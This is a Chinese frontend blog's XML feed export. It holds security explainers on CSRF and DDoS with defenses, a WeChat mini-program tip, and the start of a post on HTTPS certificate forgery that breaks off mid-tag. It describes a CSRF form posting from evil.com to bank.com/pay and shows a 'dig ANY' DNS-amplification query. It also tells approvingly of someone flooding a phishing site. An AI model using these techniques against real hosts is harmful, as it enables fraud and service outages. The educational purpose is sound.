        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h3 id="wx-previewMedia-安卓浏览视频第一次点击无反应-无法播放"><a href="#wx-previewMedia-安卓浏览视频第一次点击无反应-无法播放" class="headerlink" title="wx.previewMedia 安卓浏览视频第一次点击无反应 无法播放"></a>wx.previewMedia 安卓浏览视频第一次点击无反应 无法播放</h3><h4 id="官方文档：https-developers-weixin-qq-com-miniprogram-dev-api-media-image-wx-previewMedia-html"><a href="#官方文档：https-developers-weixin-qq-com-miniprogram-dev-api-media-image-wx-previewMedia-html" class="headerlink" title="官方文档：https://developers.weixin.qq.com/miniprogram/dev/api/media/image/wx.previewMedia.html"></a>官方文档：<a href="https://developers.weixin.qq.com/miniprogram/dev/api/media/image/wx.previewMedia.html">https://developers.weixin.qq.com/miniprogram/dev/api/media/image/wx.previewMedia.html</a></h4><p><img src="https://img1.imgtp.com/2023/06/29/xjE2Ljjp.png" class="lazyload placeholder" data-srcset="https://img1.imgtp.com/2023/06/29/xjE2Ljjp.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>去掉 poster，安卓第一次可以正常预览</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 解决方案 </tag>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF _ XSRF</title>
      <link href="/2023/06/29/frontend/security/csrf-xsrf/"/>
      <url>/2023/06/29/frontend/security/csrf-xsrf/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>一、Cross-site request forgery&#x2F;ˈfɔːrdʒəri&#x2F;，跨站请求伪造，通常缩写为 CSRF 或 XSRF，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p><p><a name="CI4BY"></a></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一、下面先介绍一下 CSRF 攻击的原理：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1646902169133-e388543f-dcdf-4086-bb78-adbd478f7264.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1646902169133-e388543f-dcdf-4086-bb78-adbd478f7264.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>二、完成 CSRF 攻击必须要有三个条件：<br />● 用户已经登录了站点 A，并在本地记录了 cookie<br />● 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点 A)。<br />● 站点 A 没有做任何 CSRF 防御</p><p>| 【示例】当我们登入转账页面后，突然眼前一亮惊现”XXX 隐私照片，不看后悔一辈子”的链接，耐不住内心躁动，立马点击了该危险的网站（页面代码如下图所示），但当这页面一加载，便会执行 submitForm 这个方法来提交转账请求，从而将 10 块转给黑客。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1646902188333-5a3f40d6-da3d-4274-9676-69a65f2f9438.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1646902188333-5a3f40d6-da3d-4274-9676-69a65f2f9438.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br>| ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————- |</p><table><thead><tr><th>【示例】你登录了 bank.com 网站。此时：你有了来自该网站的身份验证 cookie。你的浏览器会在每次请求时将其发送到 bank.com，以便识别你，并执行所有敏感的财务上的操作。<br />现在，在另外一个窗口中浏览网页时，你不小心访问了另一个网站 evil.com。该网站具有向 bank.com 网站提交一个具有启动与黑客账户交易的字段的表单<form action="https://bank.com/pay">的 JavaScript 代码。<br />你每次访问 bank.com 时，浏览器都会发送 cookie，即使该表单是从 evil.com 提交过来的。因此，银行会识别你的身份，并执行真实的付款。</th></tr></thead></table><p>| 【示例】跨站攻击示意图<br />上图中攻击者利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/355497/1603782372134-38ab73be-93f2-43c9-b895-acc20261e50a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/355497/1603782372134-38ab73be-93f2-43c9-b895-acc20261e50a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br>| ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————- |</p><p><a name="kOKhj"></a></p><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><p>一、防范 CSRF 攻击可以遵循以下几种规则：<br />●Get 请求不对数据进行修改<br />● 不让第三方网站访问到用户 Cookie<br />● 阻止第三方网站请求接口<br />● 请求时附带验证信息，比如验证码或者 Token<br />二、防御措施<br />● 检查 referer 字段<br />● 同步表单校验：表单中带有服务器生成的 token，提交时要带上<br />● 双重 cookie 校验<br><a name="Xb02V"></a></p><h2 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h2><p><br />一、可以对 Cookie 设置 SameSite 属性。<br />见 Cookie, document.cookie#SameSite：<a href="https://www.yuque.com/tqpuuk/yrrefz/ns4z0t">https://www.yuque.com/tqpuuk/yrrefz/ns4z0t</a></p><p><a name="KvPt8"></a></p><h2 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h2><p><br />一、HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求时，一般会带上 Referer 信息告诉服务器是从哪个页面链接过来的，服务器借此可以获得一些信息用于处理。</p><p>二、可以通过检查请求的来源来防御 CSRF 攻击。</p><p>三、正常请求的 referer 具有一定规律，如在提交表单的 referer 必定是在该页面发起的请求。所以通过检查 http 包头 referer 的值是不是这个页面，来判断是不是 CSRF 攻击。</p><p>四、在某些情况下如从 https 跳转到 http，浏览器处于安全考虑，不会发送 referer，服务器就无法进行 check 了。若与该网站同域的其他网站有 XSS 漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭受攻击。<br />1、出于以上原因，无法完全依赖 Referer Check 作为防御 CSRF 的主要手段。<br />2、但是可以通过 Referer Check 来监控 CSRF 攻击的发生。</p><p>五、优点<br />1、简单易行，仅需要在关键访问处增加一步校验。</p><p>六、局限性<br />1、其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><p><a name="N2SNL"></a></p><h2 id="Anti-CSRF-Token（用得最多）"><a href="#Anti-CSRF-Token（用得最多）" class="headerlink" title="Anti CSRF Token（用得最多）"></a>Anti CSRF Token（用得最多）</h2><p><br />一、目前比较完善的解决方案是加入 Anti-CSRF-Token。<br />1、即发送请求时在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器建立一个拦截器来验证这个 token。<br />2、服务器读取浏览器当前域 cookie 中这个 token 值，会进行校验该请求当中的 token 和 cookie 当中的 token 值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。</p><p>二、这种方法相比 Referer 检查要安全很多，token 可以在用户登陆后产生并放于 session 或 cookie 中，然后在每次请求时服务器把 token 从 session 或 cookie 中拿出，与本次请求中的 token 进行比对。</p><p>三、由于 token 的存在，攻击者无法再构造出一个完整的 URL 实施 CSRF 攻击。但在处理多个页面共存问题时，当某个页面消耗掉 token 后，其他页面的表单保存的还是被消耗掉的那个 token，其他页面的表单提交时会出现 token 错误。</p><p>| 【示例】】在同步渲染页面时，在表单请求中增加一个_csrf 的查询参数，这样当用户在提交这个表单的时候就会将 CSRF token 提交上来&#96;&#96;&#96;javascript</p><form method="POST" action="/upload?_csrf=" enctype="multipart/form-data">     用户名: <input name="name" />   选择头像: <input name="file" type="file" />  <button type="submit">提交</button></form>``` || --- |<p><br />四、token 仅仅是预防 csrf 用的。如果攻击者使用 xss 获取到 token，那么该方案就会失效。这样的攻击可以称为 xsrf<br><a name="qHAL1"></a></p><h2 id="双重-cookie-校验"><a href="#双重-cookie-校验" class="headerlink" title="双重 cookie 校验"></a><br />双重 cookie 校验</h2><p><br />一、一重是浏览器自动附加的 cookie，另一重就是在页面代码中通过其他手段（自定义请求头、请求体、URL 查询参数）传递的 cookie。<br />二、攻击者发起 CSRF 攻击时，请求中只会包含浏览器附加的 cookie 请求头，把这种只有一重 cookie 的请求拦掉就实现了防御。</p><p><a name="WFElw"></a></p><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p><br />一、应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制 CSRF 攻击。<br />二、但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDoS攻击</title>
      <link href="/2023/06/29/frontend/security/ddos-gong-ji/"/>
      <url>/2023/06/29/frontend/security/ddos-gong-ji/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="a5afdfe0"></a></p><h2 id="DDoS-攻击"><a href="#DDoS-攻击" class="headerlink" title="DDoS 攻击"></a>DDoS 攻击</h2><p><a name="2141f601"></a></p><h3 id="什么是-DDoS-攻击"><a href="#什么是-DDoS-攻击" class="headerlink" title="什么是 DDoS 攻击"></a>什么是 DDoS 攻击</h3><p>DDoS 全称 Distributed Denial of Service，中文意思为“分布式拒绝服务”，就是利用大量合法的分布式服务器对目标发送请求，从而导致正常合法用户无法获得服务。比喻一个饭店有 50 个位，当 50 个位都坐满之后，再想有客人进来点餐，必须等到在吃的客人吃完结账离开才行。但是在座的客人一直不离开，新来的客人只得不停地排队或者离开，餐厅相当于过载，这就是“拒绝服务”。</p><p>网络骗子无处不在，其中一种诈骗方式就是钓鱼网站。笔者曾在某 IT 论坛上见过一名网友的经历自述，该网友收到含有钓鱼网站链接的诈骗信息，但他是个搞技术的人，并没中招，反而自行编写了一个能够以高速发送网络请求的 phython 程序，针对该钓鱼网站进行打击，不一会就将其击溃了。连续攻击几天后，骗子不得不修改了域名。</p><p><a name="48bca0c6"></a></p><h3 id="DDoS-攻击的特点"><a href="#DDoS-攻击的特点" class="headerlink" title="DDoS 攻击的特点"></a>DDoS 攻击的特点</h3><p>不同于其它劫持类攻击或篡改数据类攻击，DDoS 攻击简单粗暴，可以达到直接摧毁目标的目的，只要是面向大众的服务就需要对外接口，只要有对外接口就能发起 DDoS 攻击。另外，相对其他攻击手段 DDoS 的技术要求和发动攻击的成本很低，只需要购买部分服务器权限或控制一批肉鸡即可，而且攻击相应速度很快，攻击效果可视。另一方面，DDoS 具有易攻难守的特征，服务提供商为了保证正常客户的需求需要耗费大量的资源才能和攻击发起方进行对抗。这些特点使得 DDoS 成为黑客们手中的一把很好使的利剑，而且所向霹雳。</p><p><a name="396000aa"></a></p><h3 id="DDoS-的攻击方式"><a href="#DDoS-的攻击方式" class="headerlink" title="DDoS 的攻击方式"></a>DDoS 的攻击方式</h3><p>从 DDoS 的危害性和攻击行为来看，我们可以将 DDoS 攻击方式分为以下几类：</p><p><a name="8102d76d"></a></p><h4 id="资源消耗类攻击"><a href="#资源消耗类攻击" class="headerlink" title="资源消耗类攻击"></a>资源消耗类攻击</h4><p>资源消耗类是比较典型的 DDoS 攻击，最具代表性的包括：Syn Flood、Ack Flood、UDP<br />Flood。这类攻击的目标很简单，就是通过大量请求消耗正常的带宽和协议栈处理资源的能力，从而达到服务端无法正常工作的目的。其中 Syn Flood 最为经典，其被发现于 1996 年，但至今仍然保持着强大的生命力。Syn Flood 利用 TCP 协议设计中的致命缺陷，而 TCP&#x2F;IP 协议是整个互联网的基础，这也是 Syn Flood 如此猖獗的原因。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913737822-17f3470a-103a-4d7f-b315-7da33aad95ea.png#height=375&id=R0aYo&originHeight=375&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119253&status=done&style=none&title=&width=766" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913737822-17f3470a-103a-4d7f-b315-7da33aad95ea.png#height=375&id=R0aYo&originHeight=375&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119253&status=done&style=none&title=&width=766" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="1.png"></p><p><a name="96ea2479"></a></p><h4 id="图-1-DDoS-攻击示意图"><a href="#图-1-DDoS-攻击示意图" class="headerlink" title="图 1.DDoS 攻击示意图"></a>图 1.DDoS 攻击示意图</h4><p>在正常情况下，TCP 三次握手过程如下：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913745555-ca23a659-dd9e-47ea-b9e5-c3cb905cb9a4.png#height=207&id=C8PZR&originHeight=207&originWidth=626&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45241&status=done&style=none&title=&width=626" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913745555-ca23a659-dd9e-47ea-b9e5-c3cb905cb9a4.png#height=207&id=C8PZR&originHeight=207&originWidth=626&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45241&status=done&style=none&title=&width=626" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="2.png"></p><p>（1）客户端向服务器端发送一个 SYN 包，包含客户端使用的端口号和初始序列号 x；</p><p>（2）服务器端收到客户端发送来的 SYN 包后，向客户端发送一个 SYN 和 ACK 都置位的 TCP 报文，包含确认号 x+1 和服务器端的初始序列号 y；</p><p>（3）客户端收到服务器端返回的 SYN+ACK 报文后，向服务器端返回一个确认号为 y+1、序号为 x+1 的 ACK 报文，一个标准的 TCP 连接完成。</p><p>而 SYN flood 在攻击时，首先伪造大量的源 IP 地址，分别向服务器端发送大量的 SYN 包，此时服务器端会根据各个 SYN 包中的 IP 地址发送 SYN&#x2F;ACK 包，因为源地址是伪造的，所以伪造的 IP 并不会应答，服务器端没有收到伪造 IP 的回应，会重试 3 ～ 5 次并且等待一个 SYN Time，如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的 SYN 请求，服务器端将会消耗非常多的资源来处理这种半连接，同时还要不断地对这些 IP 进行 SYN+ACK 重试，导致服务器资源枯竭，无暇理睬正常的连接请求，这就是拒绝服务。</p><p><a name="e1da5a06"></a></p><h4 id="服务消耗性攻击"><a href="#服务消耗性攻击" class="headerlink" title="服务消耗性攻击"></a>服务消耗性攻击</h4><p>相比资源消耗类攻击，服务消耗类攻击不需要太大的流量，它主要是针对服务的特点进行精确定点打击，如 web 的 CC，数据服务的检索，文件服务的下载等。这类攻击往往不是为了拥塞流量通道或协议处理通道，它们是让服务端始终处理高消耗型的业务的忙碌状态，进而无法对正常业务进行响应。</p><p>CC 攻击全称 Challenge Collapasar，CC 攻击的原理非常简单，就是对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。在 Web 应用中，查询数据库、读&#x2F;写硬盘文件等操作，相对都会消耗比较多的资源，例如一般的站点中都有搜索服务，CC 攻击可以不断地发起搜索请求来使用搜索服务，大量的搜索服务使得服务器不得不挪用资源去处理，当请求量达到一定程度时就可能导致服务过载。</p><p><a name="b7eae217"></a></p><h4 id="反射类攻击"><a href="#反射类攻击" class="headerlink" title="反射类攻击"></a>反射类攻击</h4><p>反射攻击也叫放大攻击，该类攻击以 UDP 协议为主，一般请求回应的流量远远大于请求本身流量的大小。反射攻击有很多种，包括 Smurf 攻击、NTP 反射攻击、SSDP 反射攻击和 DNS 反射攻击等。下面来看看 DNS 攻击：</p><p>DNS 服务是整个互联网的基础服务，在我们链接互联网的时候，需要通过 DNS 解析将域名转化成对应的 IP 地址。理论上来说 ISP 的 DNS 服务器只响应来自它自己客户 IP 的 DNS Query 响应，但事实上互联网上大量 DNS 服务的默认配置缺失，导致了会响应所有 IP 的 DNS Query 请求。同时，DNS 大部分使用 UDP 协议，UDP 协议没有握手过程让其去验证请求的源 IP。综合以上两点，攻击者控制傀儡机发送大量伪造了 IP 的请求给 DNS 服务器，因为 UDP 协议的原因 DNS 服务器不会去验证 IP 的真伪，直接照单全收，将请求加工包裹后反射给受害者（攻击目标服务器），而这个加工包裹正是流量放大的关键。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913752951-ac7848ae-643b-4fa5-ad25-0a59985d1716.png#height=504&id=kOpsq&originHeight=504&originWidth=926&originalType=binary&ratio=1&rotation=0&showTitle=false&size=223177&status=done&style=none&title=&width=926" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913752951-ac7848ae-643b-4fa5-ad25-0a59985d1716.png#height=504&id=kOpsq&originHeight=504&originWidth=926&originalType=binary&ratio=1&rotation=0&showTitle=false&size=223177&status=done&style=none&title=&width=926" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="3.png"></p><p><a name="5fe3a126"></a></p><h4 id="图-2-DNS-反射攻击"><a href="#图-2-DNS-反射攻击" class="headerlink" title="图 2.DNS 反射攻击"></a>图 2.DNS 反射攻击</h4><p>下面再来看一下 DNS 如何将请求数据包进行放大，输入(x.x.x.x 为 DNS 服务器 IP)：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig ANY  @x.x.x.x</span><br></pre></td></tr></table></figure><p>返回结果，这里为了节约篇幅，我们省略了大部分的响应内容。我们可以看到，响应的内容远远大于请求的数据包内容，这里就产生了放大的效果。</p><p>; &lt;&lt;&gt;&gt; DiG 9.7.3 &lt;&lt;&gt;&gt; ANY <a href="/x.x.x.x">@x.x.x.x </a> <br />;; global options: +cmd<br />;; Got answer:</p><p>………………………………….此处省略具体请求内容…………………………………………</p><p>isc.org. 484 IN RRSIG A 5 2 7200 20121125230752 20121026230752 4442 isc.org.   ViS+qg95DibkkZ5kbL8vCBpRUqI2&#x2F;M9UwthPVCXl8ciglLftiMC9WUzq Ul3FBbri5CKD&#x2F;YNXqyvjxyvmZfkQLDUmffjDB+ZGqBxSpG8j1fDwK6n1 hWbKf7QSe4LuJZyEgXFEkP16CmVyZCTITUh2TNDmRgsoxrvrOqOePWhp 8+E&#x3D;</p><p><a name="ff14d2ca"></a></p><h3 id="DDoS-防御手段"><a href="#DDoS-防御手段" class="headerlink" title="DDoS 防御手段"></a>DDoS 防御手段</h3><p><a name="fcd2801b"></a></p><h4 id="限制请求频率"><a href="#限制请求频率" class="headerlink" title="限制请求频率"></a>限制请求频率</h4><p>最常见的针对应用层 DDOS 攻击的防御措施，是在应用中针对每个“客户端”做一个请求频率的限制。它的思路很简单，通过 IP 地址与 Cookie 定位一个客户端，如果客户端的请求在一定时间内过于频繁，则对之后来自该客户端的所有请求都重定向到一个出错页面。从架构上看，这段代码需要放在业务逻辑之前，才能起到保护后端应用的目的，可以看做是一个“基层”的安全模块。</p><p>然而这种防御方法并不完美，因为它在客户端的判断依据上并不是永远可靠的。这个方案中有两个因素用以定位一个客户端：一个是 IP 地址，另一个是 Cookie。但用户的 IP 地址可能会发生改变，而 Cookie 又可能会被清空，如果 IP 地址和 Cookie 同时都发生了变化，那么就无法再定位到同一个客户端了。比如使用代理、傀儡机来让 IP 地址发生变化。</p><p><a name="d11b99d3"></a></p><h4 id="应对代理与傀儡机"><a href="#应对代理与傀儡机" class="headerlink" title="应对代理与傀儡机"></a>应对代理与傀儡机</h4><p>Yahoo 为我们提供了一个解决思路。因为发起应用层 DDOS 攻击的 IP 地址都是真实的，所以在实际情况中，攻击者的 IP 地址其实也不可能无限制增长。假设攻击者有 1000 个 IP 地址发起攻击，如果请求了 10000 次，则平均每个 IP 地址请求同一页面达到 10 次，攻击如果持续下去，单个 IP 地址的请求也将变多，但无论如何变，都是在这 1000 个 IP 地址的范围内做轮询。为此 Yahoo 实现了一套算法，根据 IP 地址和 Cookie 等信息，可以计算客户端的请求频率并进行拦截。Yahoo 设计的这套系统也是为 Web Server 开发的一个模块，但在整体架构上会有一台 master 服务器集中计算所有 IP 地址的请求频率，并同步策略到每台 WebServer 上。因此，我们也可以借助这样的一个思想实现代理、傀儡机 DDoS 防御机制。</p><p><a name="983f59c9"></a></p><h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><p>验证码是互联网中常用的技术之一，它的英文简称是 CAPTCHA（Completely AutomatedPublic Turing Test to Tell Computers and Humans Apart，全自动区分计算机和人类的图灵测试）。在很多时候，如果可以忽略对用户体验的影响，那么引入验证码这一手段能够有效地阻止自动化的重放行为。但如果用户体验比较重要，就不得不考虑放弃验证码。验证的的核心思想是识别人与机器，因此我们可以通过一段 JavaScript 来区分当前客户端是人为控制的浏览器，还是机器脚本，原理很简单，大部分的脚本都是直接构造 HTPP 包来完成请求的，例如 Phython，而不是通过浏览器发送的请求，所有从服务器发送一段 JS 脚本至客户端并给出正确结果，如果客户端是浏览器则这段 JS 脚本能正常运行并且运行结果与来自服务器的一致，但客户端是非浏览器环境的则无法执行 JS，由此可以判断客户端到底是不是浏览器。不过，有些自动话脚本是 JS 编写，内挂至浏览器运行的，那就没办法了。</p><p><a name="229071f5"></a></p><h4 id="利用-Web-Server-的防御手段"><a href="#利用-Web-Server-的防御手段" class="headerlink" title="利用 Web Server 的防御手段"></a>利用 Web Server 的防御手段</h4><p>在某些 Web Server 容器中，可以通过调整一些选项的值来达到一定程度的防御效果，比如 Apache，在 Apache 的配置文件中，有一些参数可以缓解 DDOS 攻击。比如调小 Timeout、KeepAliveTimeout 值，增加 MaxClients 值。</p><p>Apache 提供的模块接口为我们扩展 Apache、设计防御措施提供了可能。目前已经有一些开源的 Module 全部或部分实现了针对应用层 DDOS 攻击的保护。“mod_qos”就是 Apache 的一个 Module，它可以帮助缓解应用层 DDOS 攻击。比如 mod_qos 的下面这些配置就非常有价值。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913763621-b007ee55-18d4-4f0d-b807-5e5ef5c238f2.png#height=447&id=JuPon&originHeight=447&originWidth=809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45867&status=done&style=none&title=&width=809" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913763621-b007ee55-18d4-4f0d-b807-5e5ef5c238f2.png#height=447&id=JuPon&originHeight=447&originWidth=809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45867&status=done&style=none&title=&width=809" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="4.png"></p><p><a name="5db9fd7c"></a></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>DDoS 不论在过去还是现在都是一个深受关注的课题，互联网的特性决定了它不会轻易地消失。DDoS 本质是对有限资源的无限制滥用所造成的。所以，解决这个问题的核心思路就是限制每个不可信任的资源使用者的配额。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPS 证书伪造</title>
      <link href="/2023/06/29/frontend/security/https-zheng-shu-wei-zao/"/>
      <url>/2023/06/29/frontend/security/https-zheng-shu-wei-zao/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><code>HTTPS</code>  协议的安全依赖于它的证书机制，如果攻击者申请到了一张和你的网站一摸一样的证书，那你网站的安全机制也就不复存在了。本文来聊一聊，如何预防  <code>HTTPS</code>  证书伪造。</p><p><a name="xg7ZZ"></a></p><h2 id="证书劫持"><a href="#证书劫持" class="headerlink" title="证书劫持"></a>证书劫持</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597217569997-f70b5aeb-e8ea-43ea-85f2-0b25b006c45f.png#height=339&id=u4ImZ&originHeight=339&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=200924&status=done&style=none&title=&width=800" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597217569997-f70b5aeb-e8ea-43ea-85f2-0b25b006c45f.png#height=339&id=u4ImZ&originHeight=339&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=200924&status=done&style=none&title=&width=800" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>如果想部署 <code>HTTPS</code> 网站，首先向 <code>CA</code> 机构申请一张证书， <code>CA</code> 机构在审核申请者的身份后，会签发一张证书，证书中包含了申请者网站的主机名、主机公钥，同时 <code>CA</code> 机构会用自己的私钥对整个证书进行签名，并将签名添加到证书文件中，然后发送给证书申请者。证书是 TLS 协议中非常关键的一环，其主要作用：</p><ul><li>向网站访问者确认服务器的真实身份，确保客户端（浏览器）是和真正的网站提供者在通信，避免遇到中间人攻击，实现密码学中的身份认证特性。</li><li>客户端和服务器使用证书中的公钥（依赖于不同的密码协商算法，功能有所不同）协商出主密钥（<code>Master Secret</code>），有了主密钥，客户端和服务器端就可以保证通信数据是加密且没有被篡改。</li></ul><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597217591047-3eb3313e-833e-432d-9967-fa62c967bd9a.png#height=511&id=GDS9B&originHeight=511&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100270&status=done&style=none&title=&width=1080" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597217591047-3eb3313e-833e-432d-9967-fa62c967bd9a.png#height=511&id=GDS9B&originHeight=511&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100270&status=done&style=none&title=&width=1080" 